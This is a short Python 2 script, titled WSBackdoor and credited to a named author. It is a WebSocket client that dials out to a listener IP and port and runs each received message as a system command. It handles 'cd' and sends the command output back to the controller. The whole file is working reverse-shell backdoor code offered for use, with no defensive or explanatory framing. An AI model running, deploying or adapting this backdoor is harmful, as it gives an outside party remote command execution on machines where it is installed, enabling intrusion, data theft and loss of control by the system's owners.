#!/usr/bin/env python
# -*- coding: utf-8 -*-
from ws4py.client.threadedclient import WebSocketClient
import subprocess
import optparse
import os

__author__ = "f47h3r - Chase Schultz"

class WSBackdoor(WebSocketClient):
    
    def __execute__(self, cmd, args=None):
            proc = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout = proc.stdout.read() + proc.stderr.read()
            return stdout
    
    def changeDir(self, args):
        path = os.path.abspath(args)
        if os.path.exists(path) and os.path.isdir(path):
            os.chdir(path)
            return True
        else:
            return False
    
    def opened(self):
        self.send("Hello Server! - From Client\n")

    def closed(self, code, reason):
        print "Closed down", code, reason

    def received_message(self, cmd):
        self.cwd = os.getcwd()
        print "Received Message: %s Length: %d" % (str(cmd), len(cmd))
        cmd = str(cmd)
        command = cmd.split()
        if command[0] == 'cd':
            self.changeDir(command[1])
        print command
        response = self.__execute__(command)
        self.send(response)


if __name__ == '__main__':
    usage = __doc__
    author = __author__
    version= "0.01"
    parser = optparse.OptionParser(usage, None, optparse.Option, version)
    parser.add_option('-p',
                      '--port',
                      default='9002',
                      dest='port',
                      help='Listener Port')
    parser.add_option('-l',
                      '--listen',
                      default='127.0.0.1',
                      dest='ip',
                      help='Listener IP address')
    (options, args) = parser.parse_args()
    try:
        ws = WSBackdoor('http://'+options.ip+':'+options.port+'/endpoint/boxes/box1', protocols=['http-only', 'chat'])
        ws.connect()
    except KeyboardInterrupt:
        ws.close()
